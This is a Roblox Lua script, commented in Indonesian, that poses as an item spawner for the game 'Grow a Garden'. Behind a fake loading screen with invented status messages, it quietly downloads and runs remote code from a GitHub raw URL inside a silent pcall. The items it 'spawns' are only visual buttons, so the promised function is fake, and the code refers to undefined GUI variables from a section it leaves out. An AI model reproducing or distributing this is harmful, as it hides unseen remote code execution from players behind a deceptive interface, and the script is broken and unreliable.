-- Hapus loading screen sebelumnya jika ada
if game.CoreGui:FindFirstChild("FullBlueLoadingScreen") then
    game.CoreGui:FindFirstChild("FullBlueLoadingScreen"):Destroy()
end

-- Sound efek spawn
local spawnSound = Instance.new("Sound")
spawnSound.SoundId = "rbxassetid://6026984224"
spawnSound.Volume = 1
spawnSound.Name = "SpawnSound"
spawnSound.Parent = game:GetService("SoundService")

-- Buat ScreenGui
local screenGui = Instance.new("ScreenGui", game.CoreGui)
screenGui.Name = "FullBlueLoadingScreen"
screenGui.IgnoreGuiInset = true
screenGui.ResetOnSpawn = false

-- Eksekusi script utama saat loading screen muncul
task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/meijinemiko/sc/refs/heads/main/ne"))()
    end)
end)

-- Background biru
local background = Instance.new("Frame", screenGui)
background.Size = UDim2.new(1, 0, 1, 0)
background.BackgroundColor3 = Color3.fromRGB(0, 102, 204)

-- Text credit atas
local creditTop = Instance.new("TextLabel", background)
creditTop.Size = UDim2.new(1, 0, 0.05, 0)
creditTop.Position = UDim2.new(0, 0, 0.23, 0)
creditTop.BackgroundTransparency = 1
creditTop.Text = "Spawner by: Jekak121"
creditTop.Font = Enum.Font.SourceSansBold
creditTop.TextScaled = true
creditTop.TextColor3 = Color3.new(1,1,1)

-- Teks utama
local loadingText = Instance.new("TextLabel", background)
loadingText.Size = UDim2.new(1, 0, 0.1, 0)
loadingText.Position = UDim2.new(0, 0, 0.3, 0)
loadingText.BackgroundTransparency = 1
loadingText.Text = "Loading Script"
loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
loadingText.Font = Enum.Font.SourceSansBold
loadingText.TextScaled = true

-- Progress bar
local progressBarBg = Instance.new("Frame", background)
progressBarBg.Size = UDim2.new(0.6, 0, 0.05, 0)
progressBarBg.Position = UDim2.new(0.2, 0, 0.5, 0)
progressBarBg.BackgroundColor3 = Color3.fromRGB(20, 20, 80)

local progressBar = Instance.new("Frame", progressBarBg)
progressBar.Size = UDim2.new(0, 0, 1, 0)
progressBar.BackgroundColor3 = Color3.fromRGB(0, 153, 255)

-- Text credit bawah
local creditText = Instance.new("TextLabel", progressBarBg)
creditText.Size = UDim2.new(1, 0, 1, 0)
creditText.BackgroundTransparency = 1
creditText.Text = "Tiktok: @Jekak121"
creditText.Font = Enum.Font.SourceSansBold
creditText.TextScaled = true
creditText.TextColor3 = Color3.new(1,1,1)

-- Percent
local percentText = Instance.new("TextLabel", background)
percentText.Size = UDim2.new(0, 60, 0.05, 0)
percentText.Position = UDim2.new(0.81, 10, 0.5, 0)
percentText.BackgroundTransparency = 1
percentText.Text = "0%"
percentText.TextColor3 = Color3.new(1,1,1)
percentText.Font = Enum.Font.SourceSansBold
percentText.TextScaled = true

-- Status
local statusText = Instance.new("TextLabel", background)
statusText.Size = UDim2.new(1, 0, 0.05, 0)
statusText.Position = UDim2.new(0, 0, 0.57, 0)
statusText.BackgroundTransparency = 1
statusText.Text = "Initializing..."
statusText.TextColor3 = Color3.fromRGB(240, 240, 240)
statusText.Font = Enum.Font.SourceSans
statusText.TextScaled = true

local statuses = {
    "Getting server data...",
    "Finding best server...",
    "Verifying session...",
    "Loading environment...",
    "Finalizing..."
}

task.spawn(function()
    local i = 1
    while screenGui and screenGui.Parent do
        statusText.Text = statuses[i]
        i = (i % #statuses) + 1
        wait(5)
    end
end)

local TweenService = game:GetService("TweenService")
local tween = TweenService:Create(progressBar, TweenInfo.new(10, Enum.EasingStyle.Linear), {Size = UDim2.new(1, 0, 1, 0)})
tween:Play()

task.spawn(function()
    for i = 1, 10 do
        percentText.Text = tostring(math.floor(i / 10 * 100)) .. "%"
        wait(1)
    end
    percentText.Text = "100%"
end)

tween.Completed:Connect(function()
    screenGui:Destroy()
    
    -- (GUI utama spawner muncul di sini, potongan lengkap kamu sebelumnya)
    
    spawnBtn.MouseButton1Click:Connect(function()
        local itemName = nameInput.Text
        if isSeed then
            itemName = itemName .. " Seed"
        end

        spawnSound:Play()

        -- Masukkan ke inventory visual Grow a Garden
        local playerGui = game.Players.LocalPlayer:FindFirstChild("PlayerGui")
        local inventoryFrame = playerGui and playerGui:FindFirstChild("MainUI", true)
            and playerGui.MainUI:FindFirstChild("InventoryFrame", true)
            and playerGui.MainUI.InventoryFrame:FindFirstChild("ScrollingFrame", true)

        if inventoryFrame then
            local fakeItem = Instance.new("TextButton")
            fakeItem.Size = UDim2.new(0, 100, 0, 100)
            fakeItem.BackgroundColor3 = Color3.fromRGB(255, 200, 200)
            fakeItem.Text = itemName
            fakeItem.TextColor3 = Color3.new(0,0,0)
            fakeItem.Font = Enum.Font.SourceSansBold
            fakeItem.TextScaled = true
            fakeItem.Parent = inventoryFrame
        end

        local popup = Instance.new("TextLabel", gui)
        popup.Size = UDim2.new(0.4, 0, 0.07, 0)
        popup.Position = UDim2.new(0.3, 0, 0.65, 0)
        popup.BackgroundColor3 = Color3.fromRGB(0, 153, 0)
        popup.TextColor3 = Color3.new(1,1,1)
        popup.Font = Enum.Font.SourceSansBold
        popup.TextScaled = true
        popup.Text = "Successfully to Spawn \"".. itemName .."\"!!\nCheck Your Inventory"
        wait(2.5)
        popup:Destroy()
    end)
end)
